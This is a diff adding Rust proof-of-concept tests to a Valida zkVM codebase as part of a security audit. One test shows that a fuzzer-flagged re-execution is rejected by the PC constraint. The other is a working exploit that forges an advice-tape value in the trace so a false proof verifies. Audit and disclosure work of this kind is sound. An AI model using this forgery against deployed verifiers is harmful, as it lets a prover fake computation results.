@@ -13,9 +13,10 @@ use valida_basic_api::{
 use valida_cpu::{
     BeqInstruction, BneInstruction, Imm32Instruction, JalInstruction, JalvInstruction,
     LoadFpInstruction, LoadS8Instruction, LoadU8Instruction, MachineWithCpuChip,
-    MachineWithRegisters, StopInstruction, StoreU8Instruction,
+    MachineWithRegisters, ReadAdviceInstruction, StopInstruction, StoreU8Instruction,
 };
 use valida_machine::{
+    AdviceProviderWithDefault, get_fixed_advice_provider,
     Instruction, InstructionWord, Machine, MachineProof, MachineRuntime, MemoryBackendTrait,
     MultiSegmentMachineProof, Operands, ProgramROM, ProverOptions, SegmentMachine, StarkField,
     ValidaMemoryBackend, Word,
@@ -1762,6 +1763,323 @@ fn poc_s1_instruction_reexecution() {
                  rejected the tampered trace.\nError: {:?}\n\
                  Finding S-1 (EXECUTE_INSTRUCTION_AGAIN) may be a false positive \
                  from the fuzzer's execution oracle.\n",
+                e
+            );
+        }
+    }
+}
+
+// =============================================================================
+// PoC S-1-non-stop: Re-execution of add32 at non-zero PC IS caught by the
+// PC-increment constraint (fuzzer oracle false positive demonstration)
+// =============================================================================
+//
+// Root cause analysis for cases (3,1), (4,1), (6,1), (7,2), (26,3):
+//   The fuzzer flagged re-execution of add32/write/and32 at non-zero PCs as
+//   soundness bugs.  However, the CPU chip enforces:
+//
+//     when_transition().when(next_is_real).when(should_increment_pc)
+//       .assert_eq(next.pc, local.pc + 1)
+//
+//   For non-stop, non-branch instructions, `should_increment_pc = 1`.
+//   Two consecutive rows with the same pc=P (the re-execution) violate this:
+//     next.pc = P  ≠  local.pc + 1 = P+1   →  constraint fires, proof fails.
+//
+//   The fuzzer oracle only checked execution-level output equality (exitcode=0,
+//   same observable output) and *assumed* the prover would accept — but it never
+//   ran the prover.  These are oracle false positives.
+//
+// This test confirms the prover correctly rejects re-execution of add32@pc=1
+// (a non-stop instruction at non-zero PC).
+//
+// Expected outcome: prove() panics OR verify() returns Err(_).
+// The test is written to PASS when the prover rejects the tampered trace.
+
+#[test]
+fn poc_s1_non_stop_reexecution_is_rejected() {
+    use valida_alu_u32::add::Add32Instruction;
+    use valida_cpu::{Operation as CpuOperation, Registers as CpuRegisters};
+    type Val = BabyBear;
+    let fp: u32 = 0x1000;
+
+    // Program: imm32 writes 1 into mem[fp-4], add32 adds mem[fp-4]+mem[fp-4]
+    // into mem[fp-8], then stop.
+    // Layout: pc=0 → imm32, pc=1 → add32, pc=2 → stop
+    let imm32_opcode =
+        <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE;
+    let add32_opcode =
+        <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE;
+    let stop_opcode =
+        <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE;
+
+    // imm32 operands: a=-4 (dst fp-4), imm=1
+    let imm32_operands = Operands([-4, 0, 0, 0, 1]);
+    // add32 operands: a=-8 (dst), b=-4 (lhs), c=-4 (rhs)
+    let add32_operands = Operands([-8, -4, -4, 0, 0]);
+
+    let program = vec![
+        InstructionWord { opcode: imm32_opcode, operands: imm32_operands },
+        InstructionWord { opcode: add32_opcode, operands: add32_operands },
+        InstructionWord { opcode: stop_opcode, operands: Operands::default() },
+    ];
+
+    let mut machine = BasicMachine::<Val>::default();
+    machine.set_segment_number(0);
+    machine.set_max_trace_height(65536);
+    let rom = ProgramROM::new(program);
+    machine.set_program_rom(rom, ProgramTableType::Public);
+    machine.set_initial_register_values(valida_cpu::Registers { pc: 0, fp });
+
+    let mut runtime = ValidaRuntime::default_for_field::<Val>();
+    let mut state = machine.start(&mut runtime);
+    let mut metrics = BasicMachineMetrics::initialize();
+
+    let (instance_data, _output) = BasicMachine::run(&mut state, &mut metrics);
+
+    // Sanity: 3 CPU rows (imm32@0, add32@1, stop@2)
+    assert_eq!(state.machine.cpu.operations.len(), 3);
+    assert_eq!(state.machine.cpu.registers[1].pc, 1, "add32 is at pc=1");
+
+    // Inject: duplicate the add32 row (pc=1) → violates next.pc == local.pc+1
+    //
+    // After injection the CPU trace is:
+    //   clk=0: imm32  @ pc=0
+    //   clk=1: add32  @ pc=1  (legitimate)
+    //   clk=2: add32  @ pc=1  (injected re-execution)  ← pc=1 ≠ 1+1=2 VIOLATION
+    //   clk=3: stop   @ pc=2
+    let add32_reg = state.machine.cpu.registers[1];
+    let add32_op  = state.machine.cpu.operations[1].clone();
+    let add32_instr = state.machine.cpu.instructions[1];
+
+    // Insert at position 2 (after the original add32 at index 1, before stop)
+    state.machine.cpu.registers.insert(2, add32_reg);
+    state.machine.cpu.operations.insert(2, add32_op);
+    state.machine.cpu.instructions.insert(2, add32_instr);
+    state.machine.cpu.clock = 4;
+
+    // Balance program ROM bus: add32@pc=1 is now accessed twice
+    state.machine.read_word(1, true);
+
+    // The memory operations for clk=1 (the original add32) stay as-is.
+    // The duplicate at clk=2 would require its own memory operations, but we
+    // intentionally omit them — the memory bus mismatch or the PC constraint
+    // violation should be caught first.
+
+    println!("=== PoC S-1-non-stop: Attempting add32@pc=1 re-execution ===");
+    println!("CPU trace pc values: {:?}",
+        state.machine.cpu.registers.iter().map(|r| r.pc).collect::<Vec<_>>());
+    println!("Rows 1 and 2 both have pc=1; expect prover to reject via next.pc constraint.");
+
+    // Use catch_unwind to handle prove() panicking (developer assertion failure)
+    // before the proof even reaches verify().
+    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        let config = get_machine_config();
+        let (prover_opts, show_preprocessed, show_preprocessed_dims, show_public_verifier) =
+            prover_options();
+        let (pk, vk) = state
+            .machine
+            .pre_process(&config, show_preprocessed, show_preprocessed_dims);
+        let proof = state.machine.prove(&config, &pk, prover_opts, &instance_data);
+        state.machine.verify(&config, &proof, &vk, &instance_data, show_public_verifier)
+    }));
+
+    match result {
+        Err(_panic) => {
+            // prove() panicked — an internal soundness assertion caught the tampered trace.
+            println!(
+                "\n[S-1-non-stop CONFIRMED REJECTION] prove() panicked: the developer \
+                 assertion inside the prover detected the constraint violation \
+                 (next.pc mismatch for add32 at non-zero pc=1). \
+                 This case is NOT a soundness bug — the PC-increment constraint protects it.\n"
+            );
+        }
+        Ok(Err(e)) => {
+            println!(
+                "\n[S-1-non-stop CONFIRMED REJECTION] verify() returned Err: {:?}. \
+                 The PC-increment constraint correctly rejected re-execution of \
+                 add32@pc=1. Fuzzer cases (3,1),(4,1),(6,1),(7,2),(26,3) are \
+                 oracle false positives.\n", e
+            );
+        }
+        Ok(Ok(())) => {
+            panic!(
+                "\n[S-1-non-stop UNEXPECTED ACCEPTANCE] verify() returned Ok(()): \
+                 the prover accepted re-execution of add32@pc=1. \
+                 This would indicate the PC-increment constraint is broken!\n"
+            );
+        }
+    }
+}
+
+// =============================================================================
+// PoC S-1-advice: Advice Tape Forgery Bypasses All Constraints
+// =============================================================================
+//
+// Root cause (case 27,3 from arguzz report — distinct from stop@pc=0):
+//   The CPU chip defines an `is_advice` column for the `read_advice` instruction
+//   but applies ZERO constraints to it:
+//
+//     cpu/src/stark.rs:117:
+//       let _is_advice = local.opcode_flags.is_advice; // TODO: unused
+//
+//   The advice tape (external non-deterministic input) is read during execution
+//   and the value is written to memory.  The CPU's memory write channel records
+//   the value, and the memory multiset argument verifies CPU-send == memory-
+//   receive — but only that the claimed value is consistent *with itself*.
+//   Nothing links the claimed value back to the actual tape content.
+//
+//   A malicious prover can therefore change any advice tape byte to any other
+//   value by:
+//     1. Modifying the `Write` entry in the MemoryChip's operations BTreeMap
+//        before `prove()` is called (the CPU trace is generated lazily from
+//        this BTreeMap, so both the CPU and memory traces see the forged value).
+//     2. Both chips are mutually consistent with the forged value → proof passes.
+//
+// The PoC:
+//   - Runs a two-instruction program: `read_advice, stop`.
+//   - The advice tape supplies byte 0x42, which is written to mem[fp-4].
+//   - After execution (before prove), the Write in the memory chip's BTreeMap
+//     is changed from 0x42 to 0xFF (the forged value).
+//   - prove() + verify() are called on the tampered trace.
+//   - If verify() returns Ok(()) → the advice tape is unconstrained (bug confirmed).
+//   - If verify() returns Err(_) → some constraint catches the forgery (refuted).
+//
+// Expected outcome for the bug to be present: verify() returns Ok(()).
+
+#[test]
+fn poc_s1_advice_tape_forgery() {
+    use valida_memory::Operation as MemOperation;
+    type Val = BabyBear;
+    let fp: u32 = 0x1000;
+    let advice_dst_offset: i32 = -4; // operand a: mem[fp - 4] receives the tape byte
+
+    // Program: read_advice (read one byte from tape into mem[fp-4]), stop
+    let read_opcode =
+        <ReadAdviceInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE;
+    let stop_opcode =
+        <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE;
+
+    let program = vec![
+        InstructionWord {
+            opcode: read_opcode,
+            operands: Operands([advice_dst_offset, 0, 0, 0, 0]),
+        },
+        InstructionWord {
+            opcode: stop_opcode,
+            operands: Operands::default(),
+        },
+    ];
+
+    let mut machine = BasicMachine::<Val>::default();
+    machine.set_segment_number(0);
+    machine.set_max_trace_height(65536);
+    let rom = ProgramROM::new(program);
+    machine.set_program_rom(rom, ProgramTableType::Public);
+    machine.set_initial_register_values(valida_cpu::Registers { pc: 0, fp });
+
+    // Supply advice byte 0x42 via the tape
+    let legitimate_byte: u8 = 0x42;
+    let forged_byte: u8 = 0xFF;
+
+    let mut runtime = ValidaRuntime::default_for_field::<Val>();
+    runtime.advice_provider =
+        AdviceProviderWithDefault(get_fixed_advice_provider(vec![legitimate_byte]));
+
+    let mut state = machine.start(&mut runtime);
+    let mut metrics = BasicMachineMetrics::initialize();
+
+    let (instance_data, _output) = BasicMachine::run(&mut state, &mut metrics);
+
+    // Sanity: 2 CPU rows (read_advice@pc=0, stop@pc=1)
+    assert_eq!(state.machine.cpu.operations.len(), 2);
+
+    // Confirm what was legitimately recorded: the memory chip should have a
+    // Write(fp-4, [0x42, 0, 0, 0]) at clk=0.
+    let mem_addr = (fp as i64 + advice_dst_offset as i64) as u32;
+    let legitimate_word = Word::from_u8(legitimate_byte);
+    {
+        let ops_at_clk0 = state.machine.mem.operations.get(&0)
+            .expect("memory operations must exist for clk=0");
+        let found_write = ops_at_clk0.iter().any(|op| {
+            matches!(op, MemOperation::Write(addr, val) if *addr == mem_addr && *val == legitimate_word)
+        });
+        assert!(found_write, "Baseline: legitimate Write(0x42) must be present at clk=0");
+    }
+
+    println!("=== PoC S-1-advice: Forging advice tape value 0x{:02X} → 0x{:02X} ===",
+             legitimate_byte, forged_byte);
+    println!("Root cause: is_advice flag is UNUSED in cpu/src/stark.rs constraints.");
+    println!("The write value is only constrained to be self-consistent between CPU and");
+    println!("memory chip traces — not tied to the actual tape content.");
+
+    // ── Injection: overwrite the Write value in three consistent places ────
+    //
+    // prove() generates CPU trace rows lazily by calling op_to_row() →
+    // set_memory_channel_values(clk, ..., machine) which reads
+    // machine.mem().operations.get(&clk).  Mutating the BTreeMap causes
+    // BOTH the CPU trace (mem_write_channels[0].value) AND the memory chip
+    // trace to use the forged value — keeping the memory multiset balanced.
+    //
+    // The memory chip's persistent-send logic also calls is_final_state() to
+    // decide whether to generate a cross-segment carry.  It uses the
+    // final_memory_state HashSet (populated at the end of run()).  We must
+    // update that too so the persistent bus stays balanced.
+    //
+    // After these three updates every chip's view of the value is 0xFF, so the
+    // constraint system sees a completely consistent (but forged) trace.
+    let forged_word = Word::from_u8(forged_byte);
+    // final_memory_state keys encode MemoryAccessTimestamp::ThisSegment as 3
+    // (see basic-api/src/machine/basic.rs run(): ThisSegment => 3).
+    let this_segment_key: u32 = 3;
+
+    // 1. Memory chip operations BTreeMap
+    {
+        let ops_at_clk0 = state.machine.mem.operations.get_mut(&0)
+            .expect("clk=0 memory operations must exist");
+        for op in ops_at_clk0.iter_mut() {
+            if let MemOperation::Write(addr, val) = op {
+                if *addr == mem_addr {
+                    *val = forged_word;
+                }
+            }
+        }
+    }
+
+    // 2. Final memory state HashSet (drives is_final_state / skip_persistent_send in memory trace)
+    //
+    // basic.rs encodes MemoryAccessTimestamp::ThisSegment as key=3 in this HashSet.
+    // The memory chip's op_to_row() checks is_final_state(addr, value, segment+AS_OFFSET)
+    // where AS_OFFSET=3 and segment_number=0 → checks key=3.
+    state.machine.final_memory_state.remove(&(mem_addr, legitimate_word, this_segment_key));
+    state.machine.final_memory_state.insert((mem_addr, forged_word, this_segment_key));
+
+    // Prove and verify the tampered trace
+    let config = get_machine_config();
+    let (prover_opts, show_preprocessed, show_preprocessed_dims, show_public_verifier) =
+        prover_options();
+    let (pk, vk) = state
+        .machine
+        .pre_process(&config, show_preprocessed, show_preprocessed_dims);
+    let proof = state.machine.prove(&config, &pk, prover_opts, &instance_data);
+    let verify_result =
+        state.machine.verify(&config, &proof, &vk, &instance_data, show_public_verifier);
+
+    match verify_result {
+        Ok(()) => {
+            println!(
+                "\n[S-1-advice PoC CONFIRMED] verify() returned Ok(()): the prover \
+                 accepted a proof claiming advice byte was 0x{:02X} when the tape \
+                 actually supplied 0x{:02X}. The is_advice constraint is completely \
+                 absent (cpu/src/stark.rs:117: TODO: unused). A malicious prover \
+                 can supply arbitrary non-deterministic inputs without detection.\n",
+                forged_byte, legitimate_byte
+            );
+            // Test passes to signal the bug is present.
+        }
+        Err(e) => {
+            panic!(
+                "\n[S-1-advice PoC REFUTED] verify() returned Err: some constraint \
+                 unexpectedly caught the advice tape forgery.\nError: {:?}\n",
                 e
             );
         }
